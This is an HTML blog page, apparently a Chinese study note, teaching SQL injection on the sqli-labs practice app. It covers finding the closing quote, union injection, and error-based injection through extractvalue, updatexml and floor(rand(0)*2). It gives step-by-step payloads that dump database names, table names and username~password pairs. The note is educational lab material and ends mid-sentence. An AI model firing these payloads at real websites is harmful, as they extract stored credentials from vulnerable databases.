@@ -1,0 +1,620 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL | Hexo</title><meta name="author" content="ZLARYY"><meta name="copyright" content="ZLARYY"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQL所谓SQL注入，就是通过把SQL命令插入到WEB表单提交或输入域名或页面请求的 查询字符串，最终达到欺骗服务器执行恶意的SQL命令，从而进一步得到相应的数据信息。 字符型注入字符型注入需要闭合符 1$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#x27;$id&#x27; LIMIT 0,1&quot;;  提交&#x2F;?id&#x3D;1’ and">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL">
+<meta property="og:url" content="https://zlaryy123.github.io/2026/02/22/SQL/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="SQL所谓SQL注入，就是通过把SQL命令插入到WEB表单提交或输入域名或页面请求的 查询字符串，最终达到欺骗服务器执行恶意的SQL命令，从而进一步得到相应的数据信息。 字符型注入字符型注入需要闭合符 1$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#x27;$id&#x27; LIMIT 0,1&quot;;  提交&#x2F;?id&#x3D;1’ and">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://zlaryy123.github.io/img/avertar.png">
+<meta property="article:published_time" content="2026-02-22T06:50:00.000Z">
+<meta property="article:modified_time" content="2026-02-22T07:00:14.076Z">
+<meta property="article:author" content="ZLARYY">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zlaryy123.github.io/img/avertar.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SQL",
+  "url": "https://zlaryy123.github.io/2026/02/22/SQL/",
+  "image": "https://zlaryy123.github.io/img/avertar.png",
+  "datePublished": "2026-02-22T06:50:00.000Z",
+  "dateModified": "2026-02-22T07:00:14.076Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "ZLARYY",
+      "url": "https://ZLARYY123.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://zlaryy123.github.io/2026/02/22/SQL/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQL',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Hexo</span></a><a class="nav-page-title" href="/"><span class="site-name">SQL</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">SQL</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-02-22T06:50:00.000Z" title="Created 2026-02-22 14:50:00">2026-02-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-02-22T07:00:14.076Z" title="Updated 2026-02-22 15:00:14">2026-02-22</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p>所谓SQL注入，就是通过把SQL命令插入到WEB表单提交或输入域名或页面请求的 查询字符串，最终达到欺骗服务器执行恶意的SQL命令，从而进一步得到相应的数据信息。</p>
+<h1 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h1><p>字符型注入需要闭合符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>提交&#x2F;?id&#x3D;1’ and  1&#x3D;1结果为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;1&#x27; and 1=1&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这时候就多出来了一个’，所以我们需要用注释符（–+或%23或#）将后面的内容注释掉</p>
+<p>常见的闭合符有：’  “  ‘)  “)  其他</p>
+<p>假设我们无法查看源码的时候我们怎么判断闭合符是什么：</p>
+<p>我们可以尝试输入两种不同的闭合符：</p>
+<img src="/2026/02/22/SQL/1-3.png" class="" title="1-3">
+
+<p>我们传入的内容是<code>/?id=1&#39;&quot;</code></p>
+<p>报错内容是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>&#39;&quot;&#39; LIMIT 0,1&#39;</code>就告诉我们闭合符是什么了：</p>
+<p>该报错内容首先用’’单引号包裹问题地方的字符串，所以有问题地方为<code>&quot;&#39; LIMIT 0,1</code>，这意味着我们传入的’”前一个单引号成功起到了闭合作用而后一个双引号和原本的闭合符成为了出现语法错误的内容，所以闭合符为’单引号</p>
+<h1 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h1><p>数字型注入不需要闭合符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>提交&#x2F;?id&#x3D;1 and 1&#x3D;1结果为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Union联合注入"><a href="#Union联合注入" class="headerlink" title="Union联合注入"></a>Union联合注入</h1><p>这里以sqli-labs的Less-1为例：</p>
+<img src="/2026/02/22/SQL/1-1.png" class="" title="1-1">
+
+<p>根据提示，这一关需要我们输入一个名为id的参数并且值为数字，查找注入点之后应该发现是GET型传参</p>
+<img src="/2026/02/22/SQL/1-2.png" class="" title="1-2">
+
+<p>经过尝试发现为字符型注入并且闭合符为’单引号</p>
+<p>union联合注入步骤如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&#x27; group by 4 --+ //报错     /*group by也可替换为order by*/</span><br><span class="line">/?id=1&#x27; group by 3 --+ //成功登录</span><br><span class="line">//判断原有的查询中列数为3</span><br><span class="line">/?id=0&#x27; union select 1,database(),3  --+ //查询数据库名</span><br><span class="line">/?id=0&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 --+ //查询表名</span><br><span class="line">/?id=0&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database()),3 --+  //查询列名</span><br><span class="line">/?id=0&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),3 --+  //查询指定表名中的列名</span><br><span class="line">/?id=0&#x27; union select 1,(select group_concat(username,&#x27;~&#x27;,password) from users),3 --+  //查询指定表名中指定列名的内容并通过~字符连接起来</span><br></pre></td></tr></table></figure>
+
+<p>接下来详细解释这些 payload的一些细节：</p>
+<ol>
+<li><p>为什么需要用到UNION：</p>
+<p>当我们试图通过注入查询数据库名时，通常会使用database()函数，但原有的网页代码并没有这个函数，就必须把自己的查询强行拼接到原有查询后面，这就需要用到UNION 或 UNION SELECT</p>
+</li>
+<li><p>为什么需要判断列数：</p>
+<p>在SQL数据库中，参与UNION联合查询的左右两边列数必须完全一致</p>
+</li>
+<li><p>为什么后面的payload需要把?id&#x3D;1换为?id&#x3D;0：</p>
+<p>UNION的作用是把两个独立的SELECT查询结果上下拼接成一张表，原始查询需要查id,uername,password三列，（所以判断列数为3），由于该回显只会回显第一行的内容，如果前面的查询成功执行，那么查询结果一共有两行，为我们无法看到后面的查询结果，所以需要让前一行查询失败，这样查询结果就只有一行内容，同理我们把注入结果(database()结果)放在第二列也是由于第一列没有回显</p>
+</li>
+<li><p>对一些名词的解释：</p>
+<ul>
+<li>information.schema：这是MySQL5.0版本之后自带的系统数据库，里面存放有MySQL服务器上所有数据库信息</li>
+<li>.tables：这是information_schema库里面的一个具体的表，这个表记录了整个 MySQL 系统中所有的表的信息。其中有一个字段叫 <code>table_name</code>，顾名思义，存的就是表的名字。</li>
+<li>table_schema：这与table_name一样也是information_schema.tables里面的一个字段，表示该表所属的数据库名</li>
+<li>database()：这是一个MySQL内置函数，它会返回当前网站正在连接使用的数据库名称</li>
+<li>group_concat()：这是MySQL中的一个聚合函数，可以将查询出来的多行结果合并为一个长字符串，默认用,逗号分隔</li>
+</ul>
+</li>
+</ol>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="extractValue"><a href="#extractValue" class="headerlink" title="extractValue"></a>extractValue</h2><p>当网页没有回显位置（页面上不显示union  select的查询数据）但是可以显示数据库的报错信息时，可以采用报错注入</p>
+<p>extractvalue正常用法是从XML中提取数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXTRACTVALUE(xml_document, xpath_string)</span><br></pre></td></tr></table></figure>
+
+<p>参数1(<code>xml_document</code>)：一段 XML 格式的字符串。</p>
+<p>参数2(<code>xpath_string</code>)：一段 XPath 路径（类似于文件目录的路径，比如 <code>/a/b/c</code>），用来告诉 MySQL 去哪里找数据。</p>
+<p>但是如果采用如下方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1,concat(&#x27;~&#x27;,(select database()))) --+</span><br></pre></td></tr></table></figure>
+
+<p>那么MySQL就会试图解析错误的XPath：<code>~+查询到的数据库名称</code>，这样一串报错信息就会回显出来</p>
+<p>concat()将查询内容与指定字符~拼接在一起就能确保绝对能报错</p>
+<p>这里以Less-5为例：</p>
+<img src="/2026/02/22/SQL/5-1.png" class="" title="5-1">
+
+<p>可以看到没有回显我们的正常查询结果，尝试采用报错注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&#x27; and 1=1 --+ //判断注入类型</span><br><span class="line">/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select database()))) --+ //查询数据库名</span><br><span class="line">/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+ //查询表名</span><br><span class="line">/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=database()))) --+ //查询列名</span><br><span class="line">/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))) --+ //查询指定表名中的列名</span><br><span class="line">/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(username,&#x27;~&#x27;,password) from users))) --+  //查询指定表名中指定列名的内容并通过~字符连接起来</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/22/SQL/5-2.png" class="" title="5-2">
+
+<p>不过可以看到在查询最终username和password结果并将他们用~拼接起来时，发现似乎不能显示完所有的信息</p>
+<p>这是由于extractvalue函数存在长度限制，他能返回的字符串最多只有32个字符，如果要查询的内容通过group_concat()拼接后总长度超过32个字符就会被截断，所以我们先需要用到substring函数解决这个问题</p>
+<h3 id="substring"><a href="#substring" class="headerlink" title="substring()"></a>substring()</h3><p>标准用法为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUBSTRING(要截取的字符串, 开始位置, 截取长度)</span><br></pre></td></tr></table></figure>
+
+<p>举个例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substring(&#x27;ZLARYY&#123;2L47yY&#125;&#x27;,1,6)   //结果为&#x27;ZLARYY&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这一串表示从第一个字符开始截取长度为6的字符串（SQL中字符串起始位置从1开始）</p>
+<p><strong>除了substring()，还可以使用substr()和mid()，用法相同</strong></p>
+<p>有了substring函数我你们就可以解决extractvalue的截断问题了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,substring((select group_concat(username,&#x27;~&#x27;,password) from users),31,32))) --+</span><br></pre></td></tr></table></figure>
+
+<p>让查询到的内容作为substring函数的第一个参数，后面跟上开始位置和截取长度</p>
+<img src="/2026/02/22/SQL/5-3.png" class="" title="5-3">
+
+<h3 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h3><p>limit也可以用来绕过32字符截断限制：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT 偏移量(Offset), 返回的数量(Count)</span><br></pre></td></tr></table></figure>
+
+<p><code>LIMIT</code> 的作用是<strong>限制查询结果返回的行数</strong>。它的标准语法包含两个参数</p>
+<p><strong>注意：LIMIT的第一个参数偏移量从0开始</strong></p>
+<p>如果我们使用limit，那就无需使用group_concat将查询内容拼接到一行，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1,concat(&#x27;~&#x27;,(select concat(username,&#x27;~&#x27;,password) from users limit 0,1))) //将偏移量设为0，返回1行数据</span><br></pre></td></tr></table></figure>
+
+<p>这条语句在Less-5中返回内容如下：</p>
+<img src="/2026/02/22/SQL/limit.png" class="" title="limit">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1,concat(&#x27;~&#x27;,(select concat(username,&#x27;~&#x27;,password) from users limit 1,1))) //将偏移量设为1，返回1行数据</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/22/SQL/limit2.png" class="" title="limit2">
+
+<p>总的来说就是substring()、mid()用于横向切割太长的字符串，limit用于纵向切割</p>
+<h2 id="updateXml"><a href="#updateXml" class="headerlink" title="updateXml"></a>updateXml</h2><p>updatexml与extractvalue报错注入原理相同，都是利用非法的XPath路径格式报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML(xml_document, xpath_string, new_xml)</span><br></pre></td></tr></table></figure>
+
+<p>参数1(<code>xml_document</code>)：原本的 XML 字符串。</p>
+<p>参数2(<code>xpath_string</code>)：XPath 路径（告诉数据库要去 XML 的哪个位置修改）。</p>
+<p>参数3(<code>new_xml</code>)：想要替换进去的新内容。</p>
+<p>所以利用updatexml爆数据库名应该是如下语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(&#x27;~&#x27;,(select database())),2)</span><br></pre></td></tr></table></figure>
+
+<p>依然可以以Less-5为例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select database())),3) --+ //查数据库</span><br><span class="line">/?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3) --+ //查表名</span><br><span class="line">/?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=database())),3) --+ //查列名</span><br><span class="line">/?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)),3) --+ //查询指定表名中的列名</span><br><span class="line">/?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(username,&#x27;~&#x27;,password) from users)),3) --+ //查询指定表名中指定列名的内容并通过~字符连接起来</span><br><span class="line">/?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,substring((select group_concat(username,&#x27;~&#x27;,password) from users),31,32)),3) --+ //绕过截断</span><br></pre></td></tr></table></figure>
+
+<h2 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h2><p>floor报错注入中涉及到的函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rand()：随机函数，生成0~1的小数</span><br><span class="line">floor()：向下取整函数 //floor(1.9)=1 floor(1.2)=1 ceiling()为向上取整函数</span><br><span class="line">concat_ws()：将括号内数据用第一个字段连接起来</span><br><span class="line">count()：汇总统计数量</span><br><span class="line">as：别名</span><br><span class="line">limit：这里用于显示指定行数</span><br><span class="line">group by：分组语句</span><br></pre></td></tr></table></figure>
+
+<p>还有一个伪随机数概念：如果只调用rand()函数，系统会用当前时间作为”种子“，每次的运行结果都不一样，但如果给他指定了一个固定的种子比如rand(0)，那么无论运行多少次计算出来的一系列随机数都是一样的，那么经过<code>floor(rand(0)*2)</code>处理之后，产生的序列永远是0、1、1、0、1……</p>
+<p>那么为什么需要这一串序列呢？解释如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">当MySQL处理group by floor(rand(0)*2)时，会在后台新建一张临时表，扫描数据表时底层逻辑如下：</span><br><span class="line">1.MySQL读第一行内容，第一次计算floor(rand(0)*2)为0</span><br><span class="line">2.MySQL去临时表里查找是否存在0这个主键-&gt;发现没有，于是准备插入数据表的内容到临时表</span><br><span class="line">3.在插入数据时，MySQL没有直接用刚才算出来的0，而是计算第二次floor(rand(0)*2)为1</span><br><span class="line">4.MySQL将1作为主键插入临时表</span><br><span class="line">//这是扫描第一行数据，接下来扫描第二行数据：</span><br><span class="line">1.MySQL继续扫描，第三次计算floor(rand(0)*2)为1</span><br><span class="line">2.MySQL去临时表里查找是否存在1这个主键-&gt;发现存在，于是直接把主键1对应的数量（count）加1。这里没有触发重新计算</span><br><span class="line">//接下来扫描第三行数据：</span><br><span class="line">1.MySQL进行第四次计算floor(rand(0)*2)为0</span><br><span class="line">2.MySQL去临时表里查找是否存在0这个主键-&gt;发现没有，于是准备插入数据表的内容到临时表</span><br><span class="line">3.与扫描第一行数据时一样，没有直接使用第四次计算得到的0，而是进行第五次计算floor(rand(0)*2)为1</span><br><span class="line">4.MySQL试图将1作为新主键再次插入临时表，但是由于临时表中已经包含了1这个主键，导致MySQL崩溃报错</span><br><span class="line">Duplicate entry &#x27;1&#x27; for key &#x27;group_key&#x27; （主键冲突！）</span><br></pre></td></tr></table></figure>
+
+<p>根据以上原理，如果想要实现稳定报错的话，floor(rand(0)*2)至少需要被计算五次，数据表中至少存在三行数据，所以通常去查information_schema.tables，因为这张表里数据绝对足够多</p>
+<p>这里拿到一个大佬的payload[<a target="_blank" rel="noopener" href="https://blog.csdn.net/miraclehw/article/details/129250360">SQL注入报错注入之floor()报错注入原理分析_sql注入floor-CSDN博客</a>]来分析：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 AND (SELECT 1 from </span><br><span class="line">(SELECT count(*),concat(0x23,(SELECT schema_name from information_schema.schemata LIMIT 0,1),0x23,floor(rand(0)*2)) as x </span><br><span class="line">from information_schema.`COLUMNS` GROUP BY x) </span><br><span class="line">as y)</span><br></pre></td></tr></table></figure>
+
+<p>首先<code>(SELECT schema_name from information_schema.schemata LIMIT 0,1)</code>这一串内容是查询数据库 的语法，我们把这一串内容称作’核心查询’，或者可以使用<code>(select database())</code>，当然别忘了数据表中至少有三行数据的条件，这里采用的是information_schema.`COLUMNS`，如果想要使用database()可以利用我们之前提到的information_schema.tables</p>
+<p>然后看第二层：<code>concat(0x23,(核心查询),0x23,floor(rand(0)*2)) as x</code></p>
+<p>0x23为#的十六进制，concat将查询内容按照<code>#查询结果#floor(rand(0)*2)</code>拼接在一起并给这串字符串起别名为x，假设数据库名叫做security，那么x会在两种字符串中反复切换：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#security#0</span><br><span class="line">#security#1</span><br></pre></td></tr></table></figure>
+
+<p>之后是触发报错的代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(*), (拼接的x) from information_schema.tables group by x</span><br></pre></td></tr></table></figure>
+
+<p>这串代码会以x作为主键建立临时表并统计数量（count(*)），那么就会按之前说的逻辑实现报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Duplicate entry &#x27;#security#1&#x27; for key &#x27;group_key&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>最后是最外层内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND (SELECT 1 from (报错引擎) as y)</span><br></pre></td></tr></table></figure>
+
+<p>这是为了符合MySQL的语法规则：</p>
+<p>在 MySQL 中，如果你的 <code>FROM</code> 后面跟的不是一个真实的表名，而是一段子查询语句 <code>(SELECT ...)</code>，这种被称为<strong>派生表（Derived Table）</strong>。MySQL 强制要求<strong>所有的派生表都必须拥有一个属于自己的别名</strong>。</p>
+<p>这里还是以Less-5为例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&#x27; and (select 1 from (select count(*),concat(0x23,database(),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as y) --+ //查数据库</span><br><span class="line">/?id=1&#x27; and (select 1 from (select count(*),concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as y) --+  //查表名</span><br><span class="line">/?id=1&#x27; and (select 1 from (select count(*),concat(0x23,(select group_concat(column_name) from information_schema.columns where table_schema=database()),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as y) --+ //查列名</span><br><span class="line">/?id=1&#x27; and (select 1 from (select count(*),concat(0x23,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as y) --+ //查询指定表名中的列名</span><br><span class="line">/?id=1&#x27; and (select 1 from (select count(*),concat(0x23,(select concat(username,&#x27;~&#x27;,password) from users limit  0,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as y) --+ //用limit绕过限制</span><br></pre></td></tr></table></figure>
+
+<p>总结下来floor报错注入模版如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1/*闭合符*/ and (select 1 from (select count(*),concat(0x23,(select /*查询内容*/),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as y) --+</span><br></pre></td></tr></table></figure>
+
+<p>在查询最后的内容中我用的payload为：</p>
